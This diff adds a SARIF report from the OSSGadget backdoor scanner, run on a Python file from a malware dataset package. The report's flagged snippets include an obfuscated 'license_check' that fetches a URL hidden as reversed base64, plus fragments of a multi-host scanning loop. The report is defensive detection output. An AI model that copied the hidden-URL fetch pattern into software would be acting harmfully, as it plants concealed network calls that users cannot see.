@@ -1,0 +1,167 @@
+{
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "oss-detect-backdoor",
+          "organization": "Microsoft Corporation",
+          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
+          "version": "0.1.428+ed0e2cfe6a"
+        }
+      },
+      "results": [
+        {
+          "rule": {
+            "id": "BD000800"
+          },
+          "message": {
+            "text": "Backdoor: Obfuscation",
+            "id": "BD000800"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset2/request-1.0.117-r0.apk/request-1.0.117-r0/usr/lib/python3.12/site-packages/hmatch.py"
+                },
+                "region": {
+                  "startLine": 57,
+                  "startColumn": 15,
+                  "endLine": 57,
+                  "endColumn": 21,
+                  "snippet": {
+                    "text": "def license_check():\n\tgg = \"\"\n\ttry:\n\t\tgg = urlopen(base64.b64decode(\"=82cus2Ylh2YvQ3clVXclJ3Lw9GdukHelR2LvoDc0RHa\"[::-1]).decode('utf-8')).read().decode('utf-8')\n\texcept Exception as e:\n\t\tpass\n\tif \"license\" in gg:\n",
+                    "rendered": {
+                      "text": "def license_check():\n\tgg = \"\"\n\ttry:\n\t\tgg = urlopen(base64.b64decode(\"=82cus2Ylh2YvQ3clVXclJ3Lw9GdukHelR2LvoDc0RHa\"[::-1]).decode('utf-8')).read().decode('utf-8')\n\texcept Exception as e:\n\t\tpass\n\tif \"license\" in gg:\n",
+                      "markdown": "`def license_check():\n\tgg = \"\"\n\ttry:\n\t\tgg = urlopen(base64.b64decode(\"=82cus2Ylh2YvQ3clVXclJ3Lw9GdukHelR2LvoDc0RHa\"[::-1]).decode('utf-8')).read().decode('utf-8')\n\texcept Exception as e:\n\t\tpass\n\tif \"license\" in gg:\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000800"
+          },
+          "message": {
+            "text": "Backdoor: Obfuscation",
+            "id": "BD000800"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset2/request-1.0.117-r0.apk/request-1.0.117-r0/usr/lib/python3.12/site-packages/hmatch.py"
+                },
+                "region": {
+                  "startLine": 2,
+                  "startColumn": 84,
+                  "endLine": 2,
+                  "endColumn": 90,
+                  "snippet": {
+                    "text": "from __future__ import print_function\nimport sys, multiprocessing, warnings, ssl, re, argparse, time, datetime, functools,base64\nwarnings.filterwarnings(\"ignore\")\n\ntry:\n",
+                    "rendered": {
+                      "text": "from __future__ import print_function\nimport sys, multiprocessing, warnings, ssl, re, argparse, time, datetime, functools,base64\nwarnings.filterwarnings(\"ignore\")\n\ntry:\n",
+                      "markdown": "`from __future__ import print_function\nimport sys, multiprocessing, warnings, ssl, re, argparse, time, datetime, functools,base64\nwarnings.filterwarnings(\"ignore\")\n\ntry:\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset2/request-1.0.117-r0.apk/request-1.0.117-r0/usr/lib/python3.12/site-packages/hmatch.py"
+                },
+                "region": {
+                  "startLine": 100,
+                  "startColumn": 7,
+                  "endLine": 100,
+                  "endColumn": 12,
+                  "snippet": {
+                    "text": "\tprint(\"[*] Scanning started. (\" + str(len(hosts)) + \" targets loaded)\")\n\tp = multiprocessing.Pool(threads)\n\tresult = p.map_async(scan,[(host,q,match,outfile) for host in hosts])\n\tresult.get()\n\tprint(\"[*] Finished.\")\n\n\n",
+                    "rendered": {
+                      "text": "\tprint(\"[*] Scanning started. (\" + str(len(hosts)) + \" targets loaded)\")\n\tp = multiprocessing.Pool(threads)\n\tresult = p.map_async(scan,[(host,q,match,outfile) for host in hosts])\n\tresult.get()\n\tprint(\"[*] Finished.\")\n\n\n",
+                      "markdown": "`\tprint(\"[*] Scanning started. (\" + str(len(hosts)) + \" targets loaded)\")\n\tp = multiprocessing.Pool(threads)\n\tresult = p.map_async(scan,[(host,q,match,outfile) for host in hosts])\n\tresult.get()\n\tprint(\"[*] Finished.\")\n\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000600"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Windows Indicator",
+            "id": "BD000600"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset2/request-1.0.117-r0.apk/request-1.0.117-r0/usr/lib/python3.12/site-packages/hmatch.py"
+                },
+                "region": {
+                  "startLine": 90,
+                  "startColumn": 55,
+                  "endLine": 90,
+                  "endColumn": 59,
+                  "snippet": {
+                    "text": "\thosts = []\n\ttry:\n\t\twith open(file,\"r\") as f:\n\t\t\thosts = [ re.sub(r'^https?\\:\\/\\/','',hh.strip()) for hh in f.read().splitlines()]\n\t\tif len(hosts) == 0:\n\t\t\traise Exception(\"Error\")\n\texcept:\n",
+                    "rendered": {
+                      "text": "\thosts = []\n\ttry:\n\t\twith open(file,\"r\") as f:\n\t\t\thosts = [ re.sub(r'^https?\\:\\/\\/','',hh.strip()) for hh in f.read().splitlines()]\n\t\tif len(hosts) == 0:\n\t\t\traise Exception(\"Error\")\n\texcept:\n",
+                      "markdown": "`\thosts = []\n\ttry:\n\t\twith open(file,\"r\") as f:\n\t\t\thosts = [ re.sub(r'^https?\\:\\/\\/','',hh.strip()) for hh in f.read().splitlines()]\n\t\tif len(hosts) == 0:\n\t\t\traise Exception(\"Error\")\n\texcept:\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        }
+      ],
+      "columnKind": "utf16CodeUnits"
+    }
+  ]
+}
